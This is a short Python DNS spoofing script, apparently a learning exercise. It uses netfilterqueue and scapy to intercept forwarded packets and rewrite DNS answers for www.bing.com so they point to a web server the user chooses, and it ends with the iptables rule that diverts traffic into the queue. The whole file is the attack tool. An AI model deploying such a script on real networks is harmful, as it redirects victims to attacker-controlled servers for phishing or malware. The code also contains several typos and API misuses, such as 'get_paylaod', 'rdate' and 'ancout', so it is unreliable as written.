#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_paylaod())
	if scapy_packet.haslayer[scapy.DNSRR]:
		qname = scapy_packet[scapy.DNSRR].qname
		if "www.bing.com" in qname:
			print("[+] Spoofing target")
			answer = scapy.DNSRR(rrname=qname, rdate="Your_web_server_IP")
			scapy_packet[scapy.DNS].an = answer
			scapy_packet[scapy.DNS].ancout = 1

			del scapy_packet[scapy.IP].len
			del scapy_packet[scap.IP].chksum
			del scapy_packet[scapy.UDP].len
			del scapy_packet[scapy.UDP].chksum

			packet.set_payload(str(scapy_packet))

	packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0,process_packet)  # que-number, and callback function
queue.run()

'''
Run this command before executing the program:
iptables -I FORWARD -j NFQUEUE --queue-num 0
so that you can stack the requests in a queue
'''